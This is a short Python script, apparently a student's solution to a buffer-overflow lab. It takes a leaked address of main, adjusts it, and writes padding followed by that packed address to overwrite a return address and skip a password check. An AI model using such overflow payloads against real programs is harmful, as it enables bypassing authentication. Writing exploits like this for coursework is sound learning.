#!/usr/bin/env python3
import sys
import struct
import time

# make sure to use these functions to write strings or bytes (bytestring) so that the order is preserved
def writeStr(v):
    assert isinstance(v, str)
    sys.stdout.flush()
    sys.stdout.buffer.write(v.encode("ascii"))
    sys.stdout.flush()

# this function is not very useful
def writeStr_without_flush(v):
    assert isinstance(v, str)
    sys.stdout.buffer.write(v.encode("ascii"))

def writeBytes(v):
    assert isinstance(v, bytes)
    print(v)
    sys.stdout.flush()
    sys.stdout.buffer.write(v)
    sys.stdout.flush()

def writeLong(v):
    assert isinstance(v, int)
    sys.stdout.flush()
    sys.stdout.buffer.write(v.to_bytes(8, 'little'))
    sys.stdout.flush()

# Use this to debug your attack.
def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)

# Here we have the address of the main function.
pmain = int(sys.stdin.readline(), 16)

pmain -= 12


# this code is for my own notes
hex = hex(pmain)

# hexstring = '001122334455'
# >>> [hexstring[i:i+2] for i in range(0,len(hexstring), 2)]
# ['00', '11', '22', '33', '44', '55']

# first_byte_string = ("0x" + str(hex[2:4]))
# second_byte_string = ("0x" + str(hex[4:6]))
# third_byte_string = ("0x" + str(hex[6:8]))
# fourth_byte_string = ("0x" + str(hex[8:10]))
# fifth_byte_string = ("0x" + str(hex[10:12]))
# sixth_byte_string = ("0x" + str(hex[12:14]))

# End this code is for my own notes

# only for debug, not sent into std.in
eprint("Haha I got your password!\n")

# flush() will flush the screen for you, but the program will still get std.in
writeStr_without_flush("6161616112345678abcd")

# write long writes the hex addr (in int format) byte swapped.
writeLong(pmain)
writeStr("\n")
writeStr("wrong password")
writeStr("\n")

